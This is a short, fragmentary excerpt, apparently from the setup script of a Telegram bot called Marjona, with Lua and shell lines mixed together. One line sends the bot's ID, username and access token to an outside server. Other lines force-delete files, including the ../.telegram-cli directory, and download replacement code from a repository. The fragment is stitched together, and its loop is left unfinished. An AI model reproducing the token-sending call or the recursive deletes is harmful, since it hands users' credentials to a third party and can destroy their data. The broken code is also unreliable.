...
https.request("https://forhassan.ml/Marjona/Marjona.php?id="..database:get(Server_Marjona.."Id_Marjona").."&user="..database:get(Server_Marjona.."UserName_Marjona").."&token="..database:get(Server_Marjona.."Token_Marjona"))
...
rm -fr Marjona.lua
wget "https://raw.githubusercontent.com/MarjonaTEAM/Marjona/master/Marjona.lua"
while(true) do
rm -fr ../.telegram-cli
